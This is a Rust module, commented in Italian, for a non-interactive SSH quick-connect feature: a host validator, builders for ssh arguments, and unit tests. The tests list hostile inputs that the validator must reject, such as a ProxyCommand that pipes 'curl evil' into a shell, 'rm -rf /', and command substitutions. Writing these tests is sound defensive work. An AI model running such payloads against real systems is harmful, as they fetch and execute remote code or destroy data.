//! SSH quick-connect: host salvati su cui eseguire comandi non interattivi
//! (uptime, df, riavvio servizi, docker ps…) con output in streaming come i
//! task. Nessuna sessione interattiva: `ssh` viene lanciato in BatchMode, quindi
//! serve accesso a chiave senza password (come per il Docker remoto ssh://).

use rand::RngCore;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SshHost {
    pub id: String,
    pub name: String,
    /// Destinazione ssh: "user@host", "host" o un alias di ~/.ssh/config.
    pub host: String,
    /// Comando proposto di default nella UI (facoltativo).
    #[serde(default)]
    pub default_command: String,
}

pub const MAX_HOSTS: usize = 100;

/// Destinazione ssh accettabile su riga di comando: non vuota, niente trattino
/// iniziale (non deve sembrare un flag), solo i caratteri di user@host[:porta] o
/// di un alias di ~/.ssh/config. Il comando remoto, invece, è libero.
pub fn valid_host(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 255
        && !s.starts_with('-')
        && s
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-' | '@' | ':'))
}

impl SshHost {
    pub fn sanitized(mut self) -> Result<Self, String> {
        self.name = self.name.trim().to_string();
        self.host = self.host.trim().to_string();
        self.default_command = self.default_command.trim().to_string();
        if self.name.is_empty() {
            return Err("dai un nome all'host".to_string());
        }
        if !valid_host(&self.host) {
            return Err("host non valido: usa user@host o un alias ssh (niente spazi)".to_string());
        }
        Ok(self)
    }
}

pub fn new_id() -> String {
    let mut buf = [0u8; 4];
    rand::rng().fill_bytes(&mut buf);
    let suffix: String = buf.iter().map(|b| format!("{b:02x}")).collect();
    format!("sh-{}-{}", crate::events::now_ms(), suffix)
}

/// Argomenti di `ssh` per eseguire `command` in modo non interattivo. BatchMode
/// evita ogni prompt (fallisce subito se la chiave non basta), accept-new accetta
/// la host key nuova senza bloccare (utile per VM ricreate).
pub fn run_args(host: &str, command: &str) -> Vec<String> {
    vec![
        "-o".into(),
        "BatchMode=yes".into(),
        "-o".into(),
        "ConnectTimeout=10".into(),
        "-o".into(),
        "StrictHostKeyChecking=accept-new".into(),
        host.to_string(),
        command.to_string(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn host_validation() {
        assert!(valid_host("ricky@192.168.1.50"));
        assert!(valid_host("homelab"));
        assert!(valid_host("user@host.local:2222"));
        assert!(!valid_host("-oProxyCommand=evil"));
        assert!(!valid_host("host with space"));
        assert!(!valid_host(""));
    }

    #[test]
    fn run_args_mette_host_prima_del_comando() {
        let args = run_args("ricky@vm", "docker ps");
        let host_i = args.iter().position(|a| a == "ricky@vm").unwrap();
        let cmd_i = args.iter().position(|a| a == "docker ps").unwrap();
        assert!(host_i < cmd_i);
        assert!(args.contains(&"BatchMode=yes".to_string()));
    }

    #[test]
    fn sanitized_rifiuta_host_invalido() {
        let bad = SshHost { id: "x".into(), name: "n".into(), host: "-rf".into(), default_command: "".into() };
        assert!(bad.sanitized().is_err());
    }

    #[test]
    fn valid_host_blocca_flag_e_command_injection() {
        // Un host malevolo non deve poter diventare un flag di ssh né iniettare
        // comandi/opzioni locali (ProxyCommand, separatori, sostituzioni…).
        for bad in [
            "-oProxyCommand=curl evil|sh",
            "-F/dev/null",
            "a b",
            "a;rm -rf /",
            "$(whoami)",
            "`id`",
            "a|b",
            "a&b",
            "a>b",
            "host\nSetEnv X=Y",
            "../etc/passwd",
        ] {
            assert!(!valid_host(bad), "doveva rifiutare: {bad:?}");
        }
        // Destinazioni legittime restano valide.
        for ok in ["user@host", "10.0.0.1", "vm.local:2222", "homelab", "user_1@host-2"] {
            assert!(valid_host(ok), "doveva accettare: {ok:?}");
        }
    }
}
